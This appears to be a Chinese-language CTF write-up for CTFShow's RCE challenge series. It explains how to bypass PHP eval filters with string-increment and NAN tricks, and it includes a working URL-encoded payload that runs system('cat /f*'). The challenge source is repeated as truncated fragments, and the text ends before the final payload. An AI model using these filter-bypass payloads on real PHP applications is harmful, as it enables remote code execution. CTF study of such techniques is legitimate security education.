    GET:
    _=system&__=cat /f*
    POST:
    %24_%3D%5B%5D.''%3B%24_%3D%24_%5B''%3D%3D'%24'%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24___%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24___.%24__.%24_%3B%24_%3D'_'.%24_%3B%24%24_%5B_%5D(%24%24_%5B__%5D)%3B
## CTFShow[RCE挑战3]
    \"|`~\\\\]/",$ctfshow)){
                eval($ctfshow);
            }else{
                echo("Are you hacking me AGAIN?");
            }
        }else{
            phpinfo();
        }
    }
    ?>
这里限制了长度为105，然后看过滤的话这里的`^`和`~`被ban，所以继续用自增，然后这个时候考虑的`$_GET`中的`T`字符相对`G`和`E`来说是较靠后的，如果用自增获取会占用很多字符，所以这里可以去尝试构造`$_POST`，这四个字符相对来说还是挨的比较近的，所以我这里打算构造的语句是`$_POST[0]($_POST[1])`，接下来我们就可以去构造了。
首先的话，我们考虑到这个`POST`四个字符都是偏后的，同时我们这里是有数字`0`的，所以我们这里可以用`0/0`来获取`float(NAN)`，接下来需要把他转换为字符串，因为这个是无法利用的，然后我们这里可以看到`'`和`"`都被ban了，所以不能再用，不过我们这里拼接的话，其实随便拼接个什么都可以，我们这里拼接一个下划线也是可以的，所以第一步就有了
    \"|`~\\\\]/",$ctfshow)){
                eval($ctfshow);
            }else{
                echo("Are you hacking me AGAIN?");
            }
        }else{
            phpinfo();
        }
    }
    ?>
可以看到本题进一步限制了长度，要求长度小于84位，然后这里的话需要说一些缩短长度的方法。  
首先就是我们之前得到字符`N`是这样的,`$_=(0/0)._;$_=$_[0];`，然后这个的话我们其实是可以进行一个缩短的，我们可以写成这个样子`$_0=(_/_._)[0];`,这个`(_/_._)`就可以直接得到`NAN`，然后我们再加上一个`[0]`，就可以缩短长度  
然后其他就是对自增这些进行一下缩短，我构造的payload如下
    \"|`~\\\\]/",$ctfshow)){
                eval($ctfshow);
            }else{
                echo("Are you hacking me AGAIN?");
            }
        }else{
            phpinfo();
        }
    }
    ?>
这里的话将数字全ban了，同时要求字符串长度小于`73`  
然后这里的话根本没思路，参考过官方wp后，得知当`gettext`拓展开启时，`_()`就相当于`gettext()`，可以获取其中的内容，所以我们这里可以通过这种方式获取到字符`N`，然后我们构造的payload如下